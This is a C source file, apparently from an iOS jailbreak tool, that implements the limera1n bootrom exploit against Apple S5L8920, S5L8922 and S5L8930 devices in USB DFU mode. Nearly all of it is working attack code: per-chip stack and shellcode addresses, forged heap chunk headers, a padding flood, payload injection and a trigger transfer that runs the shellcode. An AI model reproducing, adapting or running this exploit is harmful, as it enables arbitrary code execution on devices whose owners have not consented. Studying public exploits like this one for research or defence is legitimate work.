/*-
 * Copyright (c) 2013, winocm. <rms@velocitylimitless.org>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <Payload/Payload.h>
#include "Static/limera1n.h"
#include <UsbIo/Usb.h>
#include <Device/Device.h>

#define usb_device_control_transfer(x, y) \
     USB_DPRINTF("Result: %d\n", usb_device_control_transfer(x, y));

extern usb_device_context_t context;

/*
 * Export payload for limera1n from those bad constants.
 */

uint8_t *limera1n_payload = Payload;
uint32_t limera1n_size    = sizeof(Payload);

#define S5L8930_STACK_ADDRESS           0x8403BF9C
#define S5L8930_SHELLCODE_ADDRESS       0x8402B001

#define S5L8922_STACK_ADDRESS           0x84033F98
#define S5L8922_SHELLCODE_ADDRESS       0x84023001

#define S5L8920_STACK_ADDRESS           0x84033FA4
#define S5L8920_SHELLCODE_ADDRESS       0x84023001

/*
 * limera1n internal functions.
 *
 * This is a bad hack? 
 */
static void get_status(struct libusb_device_handle *handle) {
    unsigned char status[6];
    int ret, i;
    ret = libusb_control_transfer(handle, 0xA1, 3, 0, 0, status, 6, 100);
}

static void dfu_notify_upload_finshed(struct libusb_device_handle *handle) {
    int ret, i;
    ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, 0, 0, 100);
    for (i=0; i<3; i++){
        get_status(handle);
    }
    libusb_reset_device(handle);
}

void __limera1n_internal(void)
{
    uint32_t i;
    uint8_t buf[0x800];
    uint8_t shellcode[0x800];
    uint32_t max_size;
    uint32_t stack_address;
    uint32_t shellcode_address;
    usb_control_packet_t packet;
    uint32_t timeout = 1000;

    /*
     * Detect devices and set variables accordingly.
     */

    switch(device_get_current_chip_id()) {
        case 0x8920:
            shellcode_address = S5L8920_SHELLCODE_ADDRESS;
            stack_address = S5L8920_STACK_ADDRESS;
            max_size = 0x24000;
            break;
        case 0x8922:
            shellcode_address = S5L8922_SHELLCODE_ADDRESS;
            stack_address = S5L8922_STACK_ADDRESS;
            max_size = 0x24000;
            break;
        case 0x8930:
            shellcode_address = S5L8930_SHELLCODE_ADDRESS;
            stack_address = S5L8930_STACK_ADDRESS;
            max_size = 0x2C000;
            break;
        default:
            warnx("unsupported device: s5l%04x", device_get_current_chip_id());
            return;
    }

    USB_DPRINTF("shellcode addr: 0x%08x, stack addr: 0x%08x, size: 0x%08x\n",
                shellcode_address, stack_address, max_size);

    /*
     * Exploit.
     */

    memset(shellcode, 0x0, 0x800);
    memcpy(shellcode, limera1n_payload, limera1n_size);

    /*
     * Reset device counters.
     */
    USB_DPRINTF("Resetting device counters\n");
    
    libusb_control_transfer(context.device_handle, 0x21, 4, 0, 0, 0, 0, 1000);

    /*
     * Generate chunk headers.
     */
    memset(buf, 0xCC, 0x800);
    for(i = 0; i < 0x800; i += 0x40) {
        uint32_t *heap = (uint32_t*)(buf + i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_address;
        heap[3] = stack_address;
    }

    /*
     * Send chunk headers.
     */
    USB_DPRINTF("Sending chunk headers\n");
    libusb_control_transfer(context.device_handle, 0x21, 1, 0, 0, buf, 0x800, 1000);

    memset(buf, 0xCC, 0x800);
    for(i = 0; i < (max_size - (0x1800)); i += 0x800) {
        libusb_control_transfer(context.device_handle, 0x21, 1, 0, 0, buf, 0x800, 1000);
    }

    /*
     * Send payload.
     */
    USB_DPRINTF("Sending payload\n");
    libusb_control_transfer(context.device_handle, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

    /*
     * Sending fake data
     */
    USB_DPRINTF("Sending fake data\n");
    memset(buf, 0xBB, 0x800);

    libusb_control_transfer(context.device_handle, 0xA1, 1, 0, 0, buf, 0x800, 1000);
    libusb_control_transfer(context.device_handle, 0x21, 1, 0, 0, buf, 0x800, 10);

    /*
     * Execute exploit
     */
    USB_DPRINTF("Executing exploit\n");
    libusb_control_transfer(context.device_handle, 0x21, 2, 0, 0, buf, 0, 1000);

    libusb_reset_device(context.device_handle);
    
    /*
     * Finish transfer.
     */
    USB_DPRINTF("Finishing transfer\n");
    dfu_notify_upload_finshed(context.device_handle);
    libusb_reset_device(context.device_handle);

    /*
     * Close and reopen device.
     */
    usb_device_close();
    sleep(4);
    usb_device_try_open(0x1227, 10);
}
